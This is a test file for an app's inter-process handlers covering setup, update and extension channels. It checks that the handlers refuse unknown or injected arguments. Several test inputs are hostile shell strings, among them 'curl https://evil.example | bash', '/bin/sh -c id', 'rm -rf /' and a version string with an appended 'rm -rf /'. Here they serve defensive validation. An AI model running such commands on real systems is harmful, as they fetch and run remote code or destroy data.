import { describe, expect, it, vi } from "vitest";
import type { CliUpdateState } from "../../shared/cli-update";
import type { ExtensionRow, ExtensionUpdateState } from "../../shared/extension-update";
import { IPC_COMMANDS } from "../../shared/ipc-types";
import type { OmpUpdateState } from "../../shared/omp-update";
import type { SetupState } from "../../shared/setup";
import { type IpcCaller, IpcRegistry } from "../web/ipc-registry";
import type { ToolsState } from "./client";
import { registerToolsIpc } from "./ipc";

const CALLER: IpcCaller = { win: null, browserWindow: null, sender: { id: 1, once: () => {} } };

function registered(rows: string[] = ["plugin:a@m:user"]) {
	const channels: string[] = [];
	const ipc = new IpcRegistry({ handle: channel => channels.push(channel), on: () => {} });
	const state: ToolsState = {
		setup: { platform: "darwin", automatic: true, ompReady: true, requiredRunning: false, items: [] } as SetupState,
		omp: { phase: "idle" } as OmpUpdateState,
		cli: { enabled: true, scheduled: true, tools: [] } as CliUpdateState,
		ext: { enabled: true, scheduled: true, rows: rows.map(key => ({ key }) as ExtensionRow) } as ExtensionUpdateState,
	};
	const tools = {
		state: vi.fn(() => state),
		setupRetry: vi.fn(async (_item: unknown) => {}),
		setupCancel: vi.fn(() => true),
		setupGitAslr: vi.fn(async () => ({ ok: true as const, images: 3 })),
		ompNow: vi.fn(async () => {}),
		cliNow: vi.fn(async (_id?: unknown) => {}),
		cliRescan: vi.fn(async () => {}),
		extNow: vi.fn(async (_key?: unknown) => {}),
		extRescan: vi.fn(async () => {}),
	};
	registerToolsIpc(ipc, tools);
	const call = (channel: string, ...args: unknown[]) => ipc.invoke(channel, CALLER, args);
	return { tools, state, call, channels };
}

describe("tools IPC", () => {
	it("serves exactly the setup, omp, tool CLI and extension channels", () => {
		expect(registered().channels.sort()).toEqual(
			[
				IPC_COMMANDS.SETUP_CANCEL,
				IPC_COMMANDS.SETUP_GET_STATE,
				IPC_COMMANDS.SETUP_GIT_ASLR,
				IPC_COMMANDS.SETUP_RETRY,
				IPC_COMMANDS.OMP_UPDATE_GET_STATE,
				IPC_COMMANDS.OMP_UPDATE_NOW,
				IPC_COMMANDS.CLI_UPDATE_GET_STATE,
				IPC_COMMANDS.CLI_UPDATE_NOW,
				IPC_COMMANDS.EXTENSION_UPDATE_GET_STATE,
				IPC_COMMANDS.EXTENSION_UPDATE_NOW,
			].sort(),
		);
	});
});

describe("setup IPC", () => {
	it("serves the state and cancels", async () => {
		const { call, tools, state } = registered();
		expect(await call(IPC_COMMANDS.SETUP_GET_STATE)).toBe(state.setup);
		expect(await call(IPC_COMMANDS.SETUP_CANCEL)).toBe(true);
		expect(tools.setupCancel).toHaveBeenCalledTimes(1);
	});

	it("retries a known item id", async () => {
		const { call, tools } = registered();
		await call(IPC_COMMANDS.SETUP_RETRY, "omp");
		expect(tools.setupRetry).toHaveBeenCalledWith("omp");
	});

	it("refuses anything that is not a known item id, before the core sees it", async () => {
		const { call, tools } = registered();
		for (const value of [
			"bun-install",
			"curl https://evil.example | bash",
			{ file: "/bin/sh", args: ["-c", "id"] },
			["omp"],
			undefined,
			null,
			42,
		]) {
			await expect(call(IPC_COMMANDS.SETUP_RETRY, value)).rejects.toThrow(/Unknown setup item/);
		}
		expect(tools.setupRetry).not.toHaveBeenCalled();
	});

	it("passes only fix or undo to the Git ASLR step", async () => {
		const { call, tools } = registered();
		expect(await call(IPC_COMMANDS.SETUP_GIT_ASLR, "undo")).toEqual({ ok: true, images: 3 });
		for (const value of ["Fix", "system", { action: "fix" }, undefined]) {
			await expect(call(IPC_COMMANDS.SETUP_GIT_ASLR, value)).rejects.toThrow(/Unknown Git ASLR action/);
		}
		expect(tools.setupGitAslr.mock.calls).toEqual([["undo"]]);
	});
});

describe("omp update IPC", () => {
	it("serves the state snapshot and Update now; nothing crosses that names a version, command or path", async () => {
		const { call, tools, state } = registered();
		expect(await call(IPC_COMMANDS.OMP_UPDATE_GET_STATE)).toBe(state.omp);
		// The arguments a renderer might add are ignored.
		await call(IPC_COMMANDS.OMP_UPDATE_NOW, "19.0.0; rm -rf /");
		expect(tools.ompNow).toHaveBeenCalledWith();
	});
});

describe("tool CLI update IPC", () => {
	it("serves the snapshot (and looks for newly installed tools) without taking an argument", async () => {
		const { call, tools, state } = registered();
		expect(await call(IPC_COMMANDS.CLI_UPDATE_GET_STATE)).toBe(state.cli);
		expect(tools.cliRescan).toHaveBeenCalledTimes(1);
	});

	it("takes a tool id or nothing for 'Update now', and refuses anything else", async () => {
		const { call, tools } = registered();
		await call(IPC_COMMANDS.CLI_UPDATE_NOW, "codex");
		await call(IPC_COMMANDS.CLI_UPDATE_NOW);
		expect(tools.cliNow.mock.calls).toEqual([["codex"], [undefined]]);
		for (const bad of ["rm -rf /", "/usr/bin/codex", "codex --version", 5, { id: "codex" }]) {
			await expect(call(IPC_COMMANDS.CLI_UPDATE_NOW, bad)).rejects.toThrow(/Unknown tool/);
		}
		expect(tools.cliNow).toHaveBeenCalledTimes(2);
	});
});

describe("extension update IPC", () => {
	it("serves the snapshot and looks for what was installed since, taking no argument", async () => {
		const { call, tools, state } = registered();
		expect(await call(IPC_COMMANDS.EXTENSION_UPDATE_GET_STATE)).toBe(state.ext);
		expect(tools.extRescan).toHaveBeenCalledTimes(1);
	});

	it("takes a row key of the current state or nothing for 'Update now', and refuses anything else", async () => {
		const { call, tools } = registered();
		await call(IPC_COMMANDS.EXTENSION_UPDATE_NOW, "plugin:a@m:user");
		await call(IPC_COMMANDS.EXTENSION_UPDATE_NOW);
		await call(IPC_COMMANDS.EXTENSION_UPDATE_NOW, null);
		expect(tools.extNow.mock.calls).toEqual([["plugin:a@m:user"], [], []]);
		for (const bad of [
			"rm -rf /",
			"/usr/bin/tool",
			"plugin:b@m:user",
			"plugin:a@m:user --force",
			5,
			{ key: "plugin:a@m:user" },
			"",
		]) {
			await expect(call(IPC_COMMANDS.EXTENSION_UPDATE_NOW, bad)).rejects.toThrow(/Unknown extension/);
		}
		expect(tools.extNow).toHaveBeenCalledTimes(3);
	});
});
